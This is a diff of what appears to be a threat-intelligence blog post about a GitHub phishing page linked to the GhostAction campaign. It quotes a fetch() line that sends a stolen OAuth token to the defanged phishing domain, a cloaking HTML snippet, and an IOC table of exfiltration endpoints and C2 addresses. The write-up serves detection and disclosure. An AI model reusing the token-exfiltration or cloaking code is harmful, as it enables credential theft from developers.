@@ -14,13 +14,13 @@ import InfraMap from '~/components/ga/InfraMap.astro';
 import PortMap from '~/components/ga/PortMap.astro';
 import Operator from '~/components/ga/Operator.astro';
 import Waves from '~/components/ga/Waves.astro';
+import IocTable from '~/components/ga/IocTable.astro';
 
-On October 10, 2026 I received a phishing email from `security@my-github[.]com`.
-The domain was registered 29 hours earlier.
-I looked up the origin IP, browsed to it with a test token, and captured the phishing page before the server blocked me.
-Inside the page source: an OAuth device flow script with a hardcoded Client ID that pointed straight to the operator's GitHub account.
-The infrastructure belongs to [GhostAction](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/), a supply-chain campaign that injects malicious GitHub Actions workflows into public repos to steal CI/CD secrets.
-Active since September 2025, it has compromised over 3,000 repositories across five waves.
+On October 10, 2026 I received a phishing email from `security@my-github[.]com`, registered 29 hours earlier.
+I pulled the origin IP, browsed to it with a test token, and captured the phishing page before the server blocked me.
+In the page source: an OAuth stealer with a hardcoded Client ID pointing straight to the operator's GitHub account.
+
+The infrastructure belongs to [GhostAction](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/): a supply-chain campaign that injects malicious GitHub Actions workflows into public repos to steal CI/CD secrets, active since September 2025 across 3,000+ repositories.
 The operator account and OAuth app behind this wave had not been publicly documented.
 
 <aside class="ga-note not-prose">
@@ -126,11 +126,13 @@ fetch("hxxps://my-github[.]com:8443/t?value=" + td.access_token
 
 ### Cloaking
 
-Without a valid 8-char tracking token: `no-referrer` redirect to `github.com`.
-From Tor exit nodes: same redirect.
-After repeated requests from the same IP: connection dropped entirely.
+Three layers of visitor filtering:
 
-```html title="Default response for non-victims" frame="code"
+- **No tracking token**: redirect to `github.com` with `no-referrer`
+- **Tor exit node**: same redirect
+- **Repeated requests**: connection dropped entirely
+
+```html title="Default response (non-victims)" frame="code"
 <html><head>
   <meta name='referrer' content='no-referrer'>
   <script>top.location.href='https://github.com';</script>
@@ -385,27 +387,7 @@ Most recent: `mnfst/docs`, committed 14:01 UTC, 25 minutes before my email.
 
 ## IOCs
 
-<figure class="ga-ioc not-prose">
-  <p class="ga-ioc-eyebrow">Indicators of compromise</p>
-  <table>
-    <tbody>
-      <tr><td>Operator</td><td><code>ookefokzkoed</code> (GitHub ID 327227770)</td></tr>
-      <tr><td>OAuth Client ID</td><td><code>Ov23ctrqCqZ79UaYKwyq</code></td></tr>
-      <tr><td>OAuth App</td><td>CI Notifier</td></tr>
-      <tr><td>Callback</td><td><code>devtools-ci[.]com</code> (non-existent)</td></tr>
-      <tr><td>Phishing domain</td><td><code>my-github[.]com</code> (Dynadot, Cloudflare)</td></tr>
-      <tr><td>C2</td><td><code>193[.]32[.]204[.]199</code> (AS153622 Madina IT, LIR: Hop Bilisim)</td></tr>
-      <tr><td>Mail relay</td><td><code>193[.]32[.]204[.]3</code> (Exim 4.97, FASTPANEL)</td></tr>
-      <tr><td>Shell org</td><td>Vigilant Cyber SAS, <code>vigilantcyber[.]top</code></td></tr>
-      <tr><td>Workflows</td><td><code>security-audit.yml</code>, <code>github_actions_security.yml</code></td></tr>
-      <tr><td>Exfil (secrets)</td><td><code>hxxp://193[.]32[.]204[.]199/?c=monami</code></td></tr>
-      <tr><td>Exfil (history)</td><td><code>hxxp://193[.]32[.]204[.]199/?c=new</code></td></tr>
-      <tr><td>Exfil (structured)</td><td><code>hxxp://193[.]32[.]204[.]199:3000/api/workflow/receive</code></td></tr>
-      <tr><td>Token exfil</td><td><code>hxxps://my-github[.]com:8443/t?value=&amp;user=</code></td></tr>
-      <tr><td>Collector</td><td><code>collector.my-github[.]com</code></td></tr>
-    </tbody>
-  </table>
-</figure>
+<IocTable />
 
 ### Detection
 
